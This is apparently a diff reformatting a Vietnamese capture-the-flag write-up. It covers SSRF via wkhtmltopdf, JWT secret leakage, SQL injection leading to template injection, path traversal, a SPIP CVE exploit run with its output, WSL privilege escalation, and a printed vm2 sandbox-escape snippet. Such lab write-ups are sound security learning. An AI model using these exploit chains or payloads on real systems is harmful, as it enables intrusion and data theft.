@@ -289,8 +289,8 @@ function detectSqli (query) {
 
 - Cùng để ý thì ở `index.js` có một routes xử lí ngoại lệ(error).
 - Middleware sẽ check error và hiển thị với template ejs:
-```
-// index.js
+
+````
 function generateError(status, message) {
     const err = new Error(message);
     err.status = status;
@@ -313,8 +313,9 @@ const renderError = (err, req, res) => {
 };
 
 module.exports = { generateError, renderError }
-```
-- Chú ý `const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"` check status để chọn tên trang hiển thị lỗi.
+````
+
+Chú ý `const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"` check status để chọn tên trang hiển thị lỗi.
 
 ![image](https://hackmd.io/_uploads/SkWrKTsQ0.png)
 
@@ -330,20 +331,26 @@ module.exports = { generateError, renderError }
 
   `"wkhtmltopdf": "^0.4.0"`
 
-- Searching thì khác nhanh tìm được vul và poc:
+Searching thì khác nhanh tìm được vul và poc:
+
 ![image](https://hackmd.io/_uploads/BkE99pj7C.png)
 
 - Khá giống với DNS binding thì mình sẽ redirect đến `file://` tùy chỉnh trên hệ thống để `wkhtmltopdf` convert file đó sang dạng pdf và truy xuất nội dung.
 - Tạo server attack + public host with ngrok:
+
 ![image](https://hackmd.io/_uploads/BJNTspoQC.png)
+
 - Thành công lấy được nội dung `/etc/passwd`
+
 ![image](https://hackmd.io/_uploads/r1DenpimR.png)
+
 ![image](https://hackmd.io/_uploads/BJZBnpiQC.png)
 
 ### Leak secret_key jwt -> authenticate to admin user.
 
 - Để truy cập được `/graphql` endpoint thì cần role của mình là `admin` cho nên ta phải control được jwt.
 - Chia sẻ 1 chút là ban đầu mình đọc:
+
 ![image](https://hackmd.io/_uploads/HJAX0Tjm0.png)
 
 - Thấy secret nên mình nghĩ có thể leak được với weak secret nhưng mà không được mà quên mất là leak được .env với ssrf ở trên :> ( phản xạ quá chậm:(( )
@@ -361,12 +368,14 @@ module.exports = { generateError, renderError }
 ![image](https://hackmd.io/_uploads/rkjGivn70.png)
 
 - Dùng token này để access đến endpoint `/graphql` nhưng lưu ý là server check `localhost`
+
 ```
 function checkInternal(req) {
     const address = req.socket.remoteAddress.replace(/^.*:/, '')
     return address === "127.0.0.1"
 }
 ```
+
 - Do đó ta sẽ phải access thông qua bug ssrf ở trên.
 
 ![image](https://hackmd.io/_uploads/SJEG3wh7R.png)
@@ -388,7 +397,9 @@ function checkInternal(req) {
 - Thử dùng hàm `loadfile` trong mysql thì thành công leak được các file hệ thống nhưng có vẻ không có quyền root với user db.
 
 ![image](https://hackmd.io/_uploads/SyI6XKnQ0.png)
+
 ![image](https://hackmd.io/_uploads/rJn07FnQA.png)
+
 ![image](https://hackmd.io/_uploads/S1c6QF37R.png)
 
 -> Hook ở đây với bug tiếp theo là mình sẽ lợi dùng hàm `writefile` để ghi vào template ejs để exploit SSTI.
@@ -398,6 +409,7 @@ function checkInternal(req) {
 - Nếu chỉ có bug SQLi thì khá khó để RCE được vì chắc chắn sẽ có hạn chế về quyền trên hệ thống nên mình sẽ khai thác thông qua chức năng hiển thị errorPage của trang web.
 
 ![image](https://hackmd.io/_uploads/H1LNtYhXA.png)
+
 ![image](https://hackmd.io/_uploads/HyvBYt3mC.png)
 
 - Sau vài lần tạo thì mình đã tạo mới file `404.ejs` và ghi nội dung từ hook sqli ở trên
@@ -454,13 +466,12 @@ Flag: `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_fb9b1487d1761dfa224ee888e57fcefd}`
 ![image](https://hackmd.io/_uploads/SyRO4GpmA.png)
 
 
-***Chắc sẽ có thắc mắc sao không được file /root/flag.txt luôn từ ssrf nhưng mà mình đã test thử không được có vẻ như là userdb không có quyền truy cập vào /root thay vào đó thì user web lại có quyền này:***
-
+Chắc sẽ có thắc mắc sao không được file /root/flag.txt luôn từ ssrf nhưng mà mình đã test thử không được có vẻ như là userdb không có quyền truy cập vào /root thay vào đó thì user web lại có quyền này:
 
 ![image](https://hackmd.io/_uploads/HJqfXU3XR.png)
 
 
-***Giải này phần MISC có khá nhiều bài web với mức độ tầm medium + easy.***
+# Giải này phần MISC có khá nhiều bài web với mức độ tầm medium + easy
 
 ## MISC/Chrono Mind
 
@@ -470,7 +481,7 @@ Flag: `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_fb9b1487d1761dfa224ee888e57fcefd}`
 - Đầu tiên mình nghĩ do đây là misc nên chắc sẽ dạng LLM (promt injection mới nổi dạo gần đây :/) nhưng mà không anh `Ngọc` nói nó chỉ là path travesal thôi :\ .
 - Đúng như vậy thật vì mình không thấy web call api nào khác.
 
-```
+````
 // main.py
 from fastapi import FastAPI, Request
 from fastapi.staticfiles import StaticFiles
@@ -595,11 +606,11 @@ def copilot_complete_and_run(response: Response, params: copilotParams):
 
     # return the response
     return {"completion": full_code, "result": evalCode(full_code)}
-```
+````
 
 - Có 3 routes chính trong route `/api` là /create ->tạo phòng chat; `/ask->chat` -> chat với bot; `/copilot/complete_and_run` -> thực hiện evalCode là tạo 1 file .py với nội dung `code` sau đó chạy nó và nhận đầu ra -> xóa file .py
 
-```
+````
 def evalCode(code):
     output = ""
     random = uuid.uuid4().hex
@@ -623,11 +634,11 @@ def evalCode(code):
         print(e, flush=True)
         cleanup(filename)
         return False
-```
+````
 - Vậy thì đây chắc chắn sẽ là endpoint mà ta hướng tới.
 - Nhưng trong này lại check compilot_key nằm trong `Config`
 
-```
+````
 //config.py
 import os
 
@@ -637,12 +648,12 @@ class Config():
     chatProgress = False
     knowledgePath = f"{os.getcwd()}/repository"
     copilot_key = "REDACTED_SECRET"
-```
+````
 - Và key này được random nên khó brute-force được :
 ![image](https://hackmd.io/_uploads/B1nDSCiQ0.png)
 - Đó là tổng quan chức năng, tiếp theo là vul của web nằm ở việc `/create` new room
 
-```
+````
 @router.post("/create")
 async def createRoom(response: Response, params: createParams):
     # rate limit room creation
@@ -692,7 +703,8 @@ def getRepository(topic):
         if os.path.exists(repoFile):
             return readFile(repoFile)
     return None
-```
+````
+
 - Có thể thấy phương thức `getRepository` dính bug `path traversal` vì dòng ``for suffix in ['', '.md']:
         repoFile = f"{Config.knowledgePath}/{topic}{suffix}"`` nên hiển nhiên ta có thể join vào file ``../config.py`` để `languagemodels` đọc compilot_key
 
@@ -720,11 +732,11 @@ user flag : `HTB{SpIP_Abu53_4_RC3}`
 - Mình chưa học nhiều về leo thang đặc quyền nên khá kém, mãi sau 1 buổi được 1 anh list cho là sudo -l thì matthew có thể access với quyền root mà không cần nhập mật khẩu, mình cứ nghĩ vào /root/root.txt là có root flag nhưng không, mình ngồi mất 3 tiếng để lục tung tất cả các file trong server cả /tmp/cache/,var/etc/,vv.. nhưng vẫn không có.
 - Cuối cùng tìm được manh mối:
 
-```
+````
 $ sudo uname -a
 
 Linux WIN-1EGDT8E0CN3 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
-```
+````
 
 - Thì con linux chạy server này chẳng qua chỉ là wsl của window thôi , root thực chất ở đây là Administrator của window.
 
@@ -736,7 +748,7 @@ Mount C: vào dir tmp:
 sudo mount -t drvfs C: /mnt/temp
 - Lúc này trong /mnt/tmp/ sẽ access được như dưới đây:
 
-```
+````
 ┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/HTBBusi/CVE-2023-27372/CVE-2023-27372-PoC]
 └─$ sudo python3 exploit.py -u http://spip.submerged.htb
 [+] The Target http://spip.submerged.htb is vulnerable
@@ -958,7 +970,7 @@ $ sudo cat /mnt/temp/Users/Administrator/Desktop/root.txt
 
 HTB{Pwn1ng_WsL_4_7h3_W1n}
 $
-```
+````
 
 user flag : `HTB{SpIP_Abu53_4_RC3}`
 root flag : `HTB{Pwn1ng_WsL_4_7h3_W1n}`
@@ -977,7 +989,7 @@ root flag : `HTB{Pwn1ng_WsL_4_7h3_W1n}`
 
 ### Nhánh main
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
 commit 1501091a639e565d40a2b3b20df3227e86d72a0e (HEAD -> main)
 Author: w4rri0r <w4rri0r@zephyr.com>
@@ -1131,7 +1143,7 @@ index 0000000..7ece558
 +}
 +
 (END
-```
+````
 - Nhìn vào kết quả hiển thị có thể thấy server có 2 commit được author `w4rri0r` commit đó là
 
 + commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d -> commit initialCommit đây là commit đầu tiên push dự án lên git
@@ -1145,14 +1157,14 @@ index 0000000..7ece558
 
 - Có thể vào thẳng trực tiếp .git để xem các file configuration và trạng thái của repo
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cd ../
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ ls
 COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  refs
-```
+````
 
 - Trở lại với flow ở trên thì lúc này mình sẽ redo lại các commit trước
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git checkout HEAD~0 -- .
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db 
 >�>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)n�;tableusersusersCREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, pass��rd TEXusersl3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 
@@ -1167,7 +1179,7 @@ l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db
 
 - Mình đã check xem trong file source.rs có phần nào của flag không thì không thấy.
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs | grep "}"
 use rusqlite::{Connection};
 }
@@ -1310,7 +1322,7 @@ fn delete_user() {
         .expect("Failed to delete user!");
 }
 
-```
+````
 
 
 Flag2: `_gOT_thE_DB_`
@@ -1321,7 +1333,7 @@ Flag2: `_gOT_thE_DB_`
 
 - Tiếp tục switch qua branch w4rri0r-changes, đầu tiên ta sẽ xem những commit tương tự như ở nhánh `main`
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
 commit bfa416eaeaff63de8f5118be829f669ffd0cc6a7 (HEAD -> w4rri0r-changes)
 Author: w4rri0r <w4rri0r@zephyr.com>
@@ -1506,7 +1518,7 @@ index 0000000..7ece558
 +}
 +
 
-```
+````
 
 - Có thể thấy ở nhánh này có 3 commits
 
@@ -1521,7 +1533,7 @@ Flag1: `HTB{g0t_tH3_p4s5`
 
 - Sau một hồi switching giữa các nhánh thì mình vô tình đọc được 1 nội dung quan trọng mà đáng lẽ ra mình nên nhớ vì từng làm dự án nhiều mem thì bắt buộc phải biết điều này :/
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ cd refs/
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ ls
 heads  stash  tags
@@ -1529,13 +1541,13 @@ l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cat stash
 a38932590c3265c1c2e0160a70e449ecfb39d3e2
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ S
 
-```
+````
 
 - Mình thấy có một stash ở đây, thì hiểu nôm na là nếu dự án có nhiều người code thì để 1 người sẽ có 1 branch riêng mà sau khi pull từ main về sẽ gỡ conflict khi code vì có thể sẽ có 2 hay nhiều người cùng sửa chúng 1 đoạn code và code của họ có thể sẽ khác nhau -> sau khi sửa xong sẽ merge từ nhánh sang main và main sẽ là source hoàn thiện nhất.
 
 - Có nhiều cách có thể stash được đoạn code được giấu trên đây thì có thể dùng vs code hoặc dùng  git command cũng được
 
-```
+````
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git stash pop
 Auto-merging source.rs
 On branch w4rri0r-changes
@@ -1571,7 +1583,7 @@ use rusqlite::{Connection};
 l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 
 
 
-```
+````
 
 Flag3 : `g0T_TH3_sT4sH}`
 
@@ -1597,7 +1609,7 @@ Flag: `HTB{g0t_tH3_p4s5_gOT_thE_DB_g0T_TH3_sT4sH}`
 
 ### bot
 
-```
+````
 import { Client, GatewayIntentBits, REST, Routes, EmbedBuilder } from "discord.js";
 import axios from "axios";
 
@@ -1812,7 +1824,8 @@ client.on("interactionCreate", async interaction => {
 
 client.login(token);
 
-```
+````
+
 - bot sử dụng 2 `dependencies` là `{
     "axios": "1.6.8",
     "discord.js": "14.14.1"
@@ -1841,7 +1854,7 @@ const evaluateCode = async (code) => {
 
 ### api
 
-```
+````
 const express = require("express");
 const { VM } = require("vm2");
 
@@ -1872,12 +1885,12 @@ app.listen(port, () => {
     console.log(`Server running on http://127.0.0.1:${port}`);
 });
 
-```
+````
 - Nhận dữ liệu thì server sử dụng vm để tạo môi trường độc lập chạy mã code.
 
 - Searching thì mình tìm được trên exploit-db poc của `vm` đúng khít phiên bản này luôn.
 
-```
+````
 const code = `
 async function fn() {
     (function stack() {
@@ -1898,7 +1911,7 @@ p.constructor = {
 };
 p.then();
 `;
-```
+````
 
 - Tiến hành lấy shell
 
